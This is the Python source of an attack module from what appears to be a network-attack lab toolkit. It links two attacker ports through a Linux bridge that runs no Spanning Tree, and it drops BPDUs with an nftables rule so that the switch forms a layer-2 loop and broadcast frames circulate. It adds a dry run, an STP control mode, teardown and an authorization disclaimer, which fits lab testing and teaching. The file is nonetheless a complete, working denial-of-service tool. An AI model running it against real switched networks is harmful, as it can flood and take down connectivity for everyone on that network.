"""STP loop induction: an attacker bridge that runs no Spanning Tree and links two switch ports.

A switch that runs Spanning Tree blocks one port of a loop. If the attacker connects two of
its ports to the switch through a bridge that does not take part in STP, the switch sees
both ports as designated and forwarding, and frames that enter one port come back through
the other. Broadcast and multicast frames then circulate until the loop is broken.

The bridge does not send or answer BPDUs. Linux relays link-local frames such as BPDUs when
its own STP is off, so this module drops the STP group address (01:80:c2:00:00:00) with an
nftables rule. Without that rule the switch receives its own BPDUs back on the second port
and blocks it, which removes the loop.

Use `run_stp=True` for the control: the attacker bridge runs STP, so it blocks one of its own
ports and no loop forms.

Intended only for networks you own or are explicitly authorized to test.

Run as a module inside the attacker's network namespace:
    ip netns exec atk python -m macabre.attacks.stp_loop_induction a1 a2
"""

from __future__ import annotations

import argparse
import re
import signal
import sys
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace

from macabre.attacks.common import Runner, run_command

IFACE_RE = re.compile(r"^[A-Za-z0-9_.-]{1,15}$")
STP_GROUP_MAC = "01:80:c2:00:00:00"
NFT_TABLE = "macabre_stp_loop"
NFT_CHAIN = "stp_drop"  # not "forward": that word is an nftables keyword


@dataclass(frozen=True)
class StpLoopInductionConfig:
    iface_a: str                        # first attacker interface, on one switch port
    iface_b: str                        # second attacker interface, on the other switch port
    run_stp: bool = False               # True = control: the bridge runs STP and blocks one port
    bridge_name: str = "br-loop"
    dry_run: bool = False

    @property
    def iface(self) -> str:
        """First interface; used for display by the GUI panel."""
        return self.iface_a

    def __post_init__(self) -> None:
        for field, value in (("iface_a", self.iface_a), ("iface_b", self.iface_b), ("bridge_name", self.bridge_name)):
            if not IFACE_RE.match(value):
                raise ValueError(f"Invalid interface name for {field}: {value!r}")
        if self.iface_a == self.iface_b:
            raise ValueError("The two interfaces must be different.")


@dataclass
class StpLoopInductionStats:
    bridged: bool = False
    status: str = ""


def setup_commands(config: StpLoopInductionConfig) -> list[list[str]]:
    """Commands that build the bridge, and the nftables rule when the bridge must not relay BPDUs."""
    stp_state = "1" if config.run_stp else "0"
    commands = [
        ["ip", "link", "add", "name", config.bridge_name, "type", "bridge", "stp_state", stp_state],
        ["ip", "link", "set", config.iface_a, "master", config.bridge_name],
        ["ip", "link", "set", config.iface_b, "master", config.bridge_name],
        ["ip", "link", "set", config.iface_a, "up"],
        ["ip", "link", "set", config.iface_b, "up"],
        ["ip", "link", "set", config.bridge_name, "up"],
    ]
    if not config.run_stp:
        commands += [
            ["nft", "add", "table", "bridge", NFT_TABLE],
            ["nft", "add", "chain", "bridge", NFT_TABLE, NFT_CHAIN,
             "{", "type", "filter", "hook", "forward", "priority", "0", ";", "policy", "accept", ";", "}"],
            ["nft", "add", "rule", "bridge", NFT_TABLE, NFT_CHAIN, "ether", "daddr", STP_GROUP_MAC, "drop"],
        ]
    return commands


def teardown_commands(config: StpLoopInductionConfig) -> list[list[str]]:
    commands = []
    if not config.run_stp:
        commands.append(["nft", "delete", "table", "bridge", NFT_TABLE])
    commands.append(["ip", "link", "delete", config.bridge_name])
    return commands


def run_stp_loop_induction(
    config: StpLoopInductionConfig,
    stop_event: threading.Event,
    on_progress: Callable[[StpLoopInductionStats], None],
    run: Runner | None = None,
) -> StpLoopInductionStats:
    """Build the bridge, hold it until `stop_event` is set, then remove it."""
    if config.dry_run:
        mode = "with STP running (control)" if config.run_stp else "with STP off and STP BPDUs dropped"
        stats = StpLoopInductionStats(
            status=f"Dry run: would bridge {config.iface_a} and {config.iface_b} {mode}. Nothing changed.",
        )
        on_progress(replace(stats))
        return stats

    if not sys.platform.startswith("linux"):
        raise RuntimeError("STP loop induction needs Linux (bridge and nftables).")

    runner = run or run_command
    stats = StpLoopInductionStats()
    try:
        for argv in setup_commands(config):
            runner(argv)
        stats.bridged = True
        stats.status = (
            f"Bridge {config.bridge_name} links {config.iface_a} and {config.iface_b}; "
            f"{'STP running (control)' if config.run_stp else 'STP off, STP BPDUs dropped'}."
        )
        on_progress(replace(stats))
        while not stop_event.is_set():
            stop_event.wait(0.5)
    finally:
        for argv in teardown_commands(config):
            try:
                runner(argv)
            except Exception:  # teardown is best effort; the namespace removal cleans up too
                pass
    stats.bridged = False
    stats.status = f"Bridge {config.bridge_name} removed."
    on_progress(replace(stats))
    return stats


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Bridge two interfaces without STP (STP loop induction).")
    parser.add_argument("iface_a")
    parser.add_argument("iface_b")
    parser.add_argument("--run-stp", action="store_true", help="control: the bridge runs STP")
    parser.add_argument("--bridge", default="br-loop", help="bridge name (default: br-loop)")
    args = parser.parse_args(argv)
    config = StpLoopInductionConfig(
        iface_a=args.iface_a, iface_b=args.iface_b, run_stp=args.run_stp, bridge_name=args.bridge,
    )
    stop_event = threading.Event()
    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, lambda *_: stop_event.set())
    run_stp_loop_induction(config, stop_event, lambda s: print(s.status, flush=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
